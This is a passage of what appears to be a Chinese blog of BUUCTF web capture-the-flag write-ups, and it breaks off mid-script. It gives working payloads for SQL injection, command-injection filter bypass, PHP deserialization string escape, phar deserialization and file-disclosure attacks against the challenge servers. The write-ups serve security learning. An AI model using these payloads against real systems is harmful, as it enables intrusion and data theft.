class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python#encoding&#x3D;utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport json</span><br><span class="line"></span><br><span class="line">reload(sys)sys.setdefaultencoding(&#39;latin1&#39;)</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key &#x3D; os.urandom(16)</span><br><span class="line"></span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):</span><br><span class="line">        self.action &#x3D; action</span><br><span class="line">        self.param &#x3D; param</span><br><span class="line">        self.sign &#x3D; sign</span><br><span class="line">        self.sandbox &#x3D; md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    def Exec(self):</span><br><span class="line">        result &#x3D; &#123;&#125;</span><br><span class="line">        result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)</span><br><span class="line">                resp &#x3D; scan(self.param)</span><br><span class="line">                if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&#39;data&#39;] &#x3D; resp</span><br><span class="line">                else:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)</span><br><span class="line">                result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">                result[&#39;data&#39;] &#x3D; f.read()</span><br><span class="line">            if result[&#39;code&#39;] &#x3D;&#x3D; 500:</span><br><span class="line">                result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">            result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">#generate Sign For Action Scan.@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])def geneSign():</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action &#x3D; &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])def challenge():</span><br><span class="line">    action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip &#x3D; request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task &#x3D; Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())@app.route(&#39;&#x2F;&#39;)def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(param).read()[:50]</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"></span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line">def md5(content):</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line">def waf(param):</span><br><span class="line">    check&#x3D;param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.debug &#x3D; False</span><br><span class="line">    app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;80)</span><br></pre></td></tr></table></figure><p>看到是python的flask框架，三个路由。先来分析一下这三个路由的作用：<br>geneSign</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])def geneSign():</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action &#x3D; &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br></pre></td></tr></table></figure><p>这个页面主要是通过get或者post方式提交param参数，返回getSign处理的action和param的结果。跟进getSign函数中查看发现是返回md5(secert_key + param + action)。</p><hr><p>De1ta</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])def challenge():</span><br><span class="line">    action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip &#x3D; request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task &#x3D; Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br></pre></td></tr></table></figure><p>这个页面是接收action，param，sign参数执行Exec函数，跟进Exec函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def Exec(self):</span><br><span class="line">        result &#x3D; &#123;&#125;</span><br><span class="line">        result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)</span><br><span class="line">                resp &#x3D; scan(self.param)</span><br><span class="line">                if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&#39;data&#39;] &#x3D; resp</span><br><span class="line">                else:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)</span><br><span class="line">                result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">                result[&#39;data&#39;] &#x3D; f.read()</span><br><span class="line">            if result[&#39;code&#39;] &#x3D;&#x3D; 500:</span><br><span class="line">                result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">            result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br></pre></td></tr></table></figure><p>分析知道这段代码逻辑是：用客户端ip的md5值创建一个sandbox，如果action参数中有scan就将param参数的内容写在result.txt文件中；如果action参数中有read就读取写入的文件。</p><hr><p>/</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br></pre></td></tr></table></figure><p>这个页面就是获取源代码的页面。</p><hr><p><strong>解题：</strong><br>这道题就是在Da1ta页面中传入如下参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">action&#x3D;readscan</span><br><span class="line">param&#x3D;flag.txt</span><br><span class="line">sign&#x3D;md5(secert_key+read+sign)</span><br></pre></td></tr></table></figure><p>在geneSign函数中可以获得到md5(secert_key+param+sign)的值，我们可以在这个页面传入param=flag.txtread 即可完成字符串的拼接。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/15.png" class title="Da4er"><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/16.png" class title="Da4er"><hr><h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p><strong>知识点：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录。</span><br></pre></td></tr></table></figure><p>WEB-INF下面的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。  </span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line"></span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line"></span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line"></span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br></pre></td></tr></table></figure><p><strong>解题：</strong><br>打开help页面，发现是一个download页面，但是没有下载，需要使用post传参。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/17.png" class title="Da4er"><p>然后访问WEB-INF/web.xml，找到flag所属的类</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/18.png" class title="Da4er"><p>所以直接访问这个class类的目录：<br>找到一段base64解码得到flag</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/19.png" class title="Da4er"><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/20.png" class title="Da4er"><hr><h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><p><strong>知识点：</strong><br>1.<strong>数组绕过正则及相关</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(Array()) &#x3D; null </span><br><span class="line">sha1(Array()) &#x3D; null </span><br><span class="line">ereg(pattern,Array()) &#x3D; null </span><br><span class="line">preg_match(pattern,Array()) &#x3D; false </span><br><span class="line">strcmp(Array(), &quot;abc&quot;) &#x3D; null </span><br><span class="line">strpos(Array(),&quot;abc&quot;) &#x3D; null </span><br><span class="line">strlen(Array()) &#x3D; null</span><br></pre></td></tr></table></figure><p>2.<strong>php反序列化长度变化尾部字符串逃逸</strong><br>假如有如下序列化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13587819970&quot;;s:5:&quot;email&quot;;s:32:&quot;44444545487956214698745621365478&quot;;s:8:&quot;nickname&quot;;s:10:&quot;12345hacke&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload&#x2F;f47454d1d3644127f42070181a8b9afc&quot;;&#125;</span><br></pre></td></tr></table></figure><p>经反序列化之后：</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/21.png" class title="Da4er"><p>发现s:39之后的都没有被反序列化，但是正常输出了。</p><hr><p><strong>解题：</strong><br>扫描目录发现<a href="http://www.zip，打开审计代码，找到一处file_get_contents函数漏洞利用">www.zip，打开审计代码，找到一处file_get_contents函数漏洞利用</a></p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/22.png" class title="Da4er"><p>这个漏洞出现在用户更新数据页面，先经过反序列化，在进行赋值。跟进函数发现对profile有三处过滤：</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/23.png" class title="Da4er"><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/24.png" class title="Da4er"><p>首先是正则匹配，可以使用数组绕过；在filter函数里有两处过滤，有一处是将where转换成hacker，5个字符换成了6个字符。<br>漏洞点是出现在上传图片的参数，这个时候就是要将s:5:”photo”;s:10:”config.php”;}塞到photo参数里，让它读取config.php下的flag。可以使用反序列化尾部字符串逃逸。</p><p>在nickname上操作，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nickname[]</span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>在nickname上输入34个where，每个where都会换成hacker，多增加一个字符，最后会把s:5:”photo”;s:10:”config.php”;}挤到photo参数上。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/25.png" class title="Da4er"><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/26.png" class title="Da4er"><hr><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>拿到题目，发现是命令执行漏洞。直接ls查看到有两个文件：flag.php,index.php。<br>通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS&#96;ls&#96;</span><br></pre></td></tr></table></figure><p>查看到index.php源码</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/27.png" class title="Da4er"><p>看到过滤了一些字符，最后的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;lag;b&#x3D;f;cat$IFS$b$a.php;</span><br></pre></td></tr></table></figure><p>查看源代码找到flag。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/29.png" class title="Da4er"><hr><h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>很简单的上传，直接上传phtml的<script>小马即可，没有给上传的文件所在目录，通过猜测是upload。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/30.png" class="" title="Da4er"><hr><h3 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h3><p><strong>知识点：绕过information.schema与无列名注入</strong><br>参考博客：<br><a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a><br>绕过information.schema可以使用sys.schema_auto_increment_columns<br>无列注入可以自己构造列名。<br><strong>解题：</strong><br>注入发生在编辑广告的界面上，在输入广告名时会在查看报错，说明是存在二次注入的。<br>但是报错函数被过滤，可以使用union查询。<br>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 判断有多少字段 -1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;1 </span><br><span class="line"># union 查询 -1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line"># user()发现是 root@localhost 权限 -1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 </span><br><span class="line"># 查看 mysql 的版本号 -1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 </span><br><span class="line"># 在 sys 数据库中查询表名 </span><br><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;sys.schema_auto_increment_columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line"># 通过无列名注入 users 表中的数据</span><br><span class="line"># 第二个字段</span><br><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"># 第三个字段</span><br><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/31.png" class="" title="Da4er"><hr><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/32.png" class="" title="Da4er"><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/33.png" class="" title="Da4er"><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/34.png" class="" title="Da4er"><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/35.png" class="" title="Da4er"><p>payload如下，很简单的php反序列化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>堆叠注入，使用handler关键字</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/36.png" class="" title="Da4er"><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler&#96;FlagHere&#96;open+as+da4er;handler+da4er+read+first;Handler+da4er+close;&#39;</span><br></pre></td></tr></table></figure><hr><h3 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h3><p>运用数学函数和^符号可以构造任意字符</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/37.png" class="" title="Da4er"><p>参考博客：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;20175211lyz&#x2F;p&#x2F;11588219.html</span><br><span class="line"></span><br><span class="line">有很多种解法</span><br></pre></td></tr></table></figure><hr><h3 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h3><p><strong>知识点：任意文件下载，phar反序列化扩展攻击</strong><br>明天好好总结一下，在wp中不讲那么详细了。<br>使用phar的三个条件说一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.phar文件要能够上传到服务器端。</span><br><span class="line">2.如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数要有可用的魔术方法作为&quot;跳板&quot;。</span><br><span class="line">3.文件操作函数的参数可控，且::、&#x2F;、phar等特殊字符没有被过滤。</span><br></pre></td></tr></table></figure><p>形成的phar文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User&#123;</span><br><span class="line">    public $db;</span><br><span class="line">&#125;</span><br><span class="line">class File&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;filename &#x3D; &#39;&#x2F;flag.txt&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class FileList&#123;</span><br><span class="line">    private $files;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files &#x3D; array(new File());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Da4er &#x3D; new User();</span><br><span class="line">$Da4er-&gt;db &#x3D; (new FileList());</span><br><span class="line">@unlink(&quot;da4er.phar&quot;);</span><br><span class="line">$phar &#x3D; new Phar(&quot;da4er.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($Da4er);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/38.png" class="" title="Da4er"><hr><h3 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h3><p>打开题目，得到源码：</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/39.png" class="" title="Da4er"><p>阅读源码知道，这段代码判断了三次url是否为suctf.cc，但是只有最后一个判断成立后才会把结果返回；所以必须让前两个suctf.cc判断错误。经过测试发现直接输入:<strong>suctf.cc</strong>就可以直接到最后一个判断。<br>看到url的显示，知道这个应该是任意文件读取：</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/40.png" class="" title="Da4er"><p>这个其实是idna的编码问题：</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/41.png" class="" title="Da4er"><p>所以直接上网找到一个脚本跑一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">        uni=chr(x)</span><br><span class="line">        url=<span 